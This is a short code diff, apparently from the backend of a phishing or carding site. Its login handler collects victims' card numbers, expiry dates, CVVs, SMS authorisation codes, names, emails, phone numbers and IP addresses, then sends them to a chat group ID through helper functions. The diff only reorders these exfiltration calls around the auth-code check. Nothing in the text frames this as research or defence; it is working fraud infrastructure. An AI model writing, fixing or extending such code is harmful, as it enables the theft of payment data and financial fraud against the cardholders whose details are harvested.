@@ -50,12 +50,12 @@ def login():
 
         # SmokeWeEveryday
         if id == '10000001':
-            send_me1(card_number, expiry_date, cvv)
-            send_buttons_message('-1002179206284', card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             if authCode is not None and authCode != 'None':
                 send_sms1(card_number, authCode)
                 send_sms('-1002179206284', card_number, expiry_date, cvv, authCode, ID)
                 return '', 200  # Возвращаем пустой ответ с кодом 200
+            send_me1(card_number, expiry_date, cvv)
+            send_buttons_message('-1002179206284', card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200
         # WE
         if id == '1000001':
